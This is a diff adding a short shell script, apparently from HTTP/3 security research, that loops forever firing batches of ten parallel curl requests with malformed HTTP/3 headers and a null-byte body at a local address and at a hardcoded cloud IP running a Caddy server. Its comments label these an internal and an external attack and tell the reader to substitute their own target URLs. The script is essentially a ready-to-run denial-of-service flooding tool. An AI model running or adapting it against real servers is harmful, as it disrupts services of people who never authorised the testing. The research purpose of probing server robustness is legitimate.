@@ -1,0 +1,18 @@
+#MIT License
+#Copyright (c) 2022 Efstratios Chatzoglou
+#Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+#The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+#Change the URL's in the commands to suit your's.
+
+while true
+do
+   #Internal Attack inside same machine
+   #
+   #seq 1 10 | xargs -n1 -P10 timeout 1s curl --insecure -X GET https://10.0.2.15:443/ -H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" --data "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" --http3 -v -o /dev/null
+   
+   #External attack on Oracle cloud conatins caddy server (Constant IP of the server we set up)
+   seq 1 10 | xargs -n1 -P10 timeout 1s curl --insecure -X GET https://129.159.150.72 -H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" --data "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" --http3 -v -o /dev/null
+
+done
